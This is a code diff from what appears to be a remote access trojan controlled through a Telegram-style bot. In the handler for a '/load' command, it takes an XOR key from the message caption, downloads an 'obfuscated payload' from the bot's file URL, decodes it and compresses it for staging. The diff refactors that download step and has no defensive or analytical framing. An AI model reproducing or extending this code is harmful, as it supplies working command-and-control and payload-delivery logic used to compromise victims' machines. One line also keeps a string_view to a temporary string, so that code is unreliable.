@@ -65,45 +65,49 @@ void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
 		}
 
 	const std::string &caption = Tbot_Message.caption.value();
+	// handling the key;
+	{
+		constexpr std::string_view load_command_string{"/load"};
+		constexpr std::size_t load_length = load_command_string.size();
 
-	constexpr std::string_view load_command_string{"/load"};
-	constexpr std::size_t load_length = load_command_string.size();
+		std::string_view key;
+			if(caption.size() >
+			   load_length) { // minimal safe length for "/load"
+				key = caption.substr(load_length); // grab after "/load"
+			}
+		auto trim_view = [](std::string_view sv) {
+			size_t start = sv.find_first_not_of(" \t\n\r");
+			size_t end = sv.find_last_not_of(" \t\n\r");
+			if(start == std::string_view::npos)
+				return std::string_view{};
+			return sv.substr(start, end - start + 1);
+		};
 
-	std::string_view key;
-		if(caption.size() > load_length) { // minimal safe length for "/load"
-			key = caption.substr(load_length); // grab after "/load"
-		}
-	auto trim_view = [](std::string_view sv) {
-		size_t start = sv.find_first_not_of(" \t\n\r");
-		size_t end = sv.find_last_not_of(" \t\n\r");
-		if(start == std::string_view::npos)
-			return std::string_view{};
-		return sv.substr(start, end - start + 1);
-	};
+		key = trim_view(key);
+		std::string_view key_str =
+		    key.empty() ? ::rat::system::getCurrentDateTime_Underscored()
+		                : std::string(key);
 
-	key = trim_view(key);
-	std::string_view key_str =
-	    key.empty() ? ::rat::system::getCurrentDateTime_Underscored()
-	                : std::string(key);
+		this->state.payload_key = key_str;
+	}
+	{
+		const std::string &file_id = Tbot_Message.files[0].id;
+		const std::string file_url =
+		    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
 
-	this->state.payload_key = key_str;
+		HANDLER_DEBUG_LOG("Downloading Obfuscated payload from File url: {}",
+		                  file_url);
 
-	::rat::networking::XorDataContext xored_data_context = {
-	    &this->state.payload_key, 0, &this->state.payload};
+		HANDLER_DEBUG_LOG("XOR key :{}", this->state.payload_key);
+		auto result =
+		    downloadXoredPayload(&this->bot->curl_client, this->state.payload,
+		                         file_url, &this->state.payload_key);
 
-	const std::string &file_id = Tbot_Message.files[0].id;
-	const std::string file_url =
-	    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
+		this->state.payload_uncompressed_size = result.size;
+		HANDLER_DEBUG_LOG("File downloaded with uncompressed size {} ",
+		                  this->state.payload_uncompressed_size);
+	}
 
-	this->curl_client_mutex.lock();
-	auto result =
-	    this->curl_client->downloadDataXored(file_url, xored_data_context);
-		if(result.curl_code != CURLE_OK) {
-			HANDLER_ERROR_LOG("Failed to download the obfuscated payload");
-			return;
-		}
-	this->curl_client_mutex.unlock();
-	this->state.payload_uncompressed_size = this->state.payload.size();
 	constexpr uint8_t zlib_compression_level = 5;
 
 	::rat::compression::zlibCompressVector(this->state.payload,
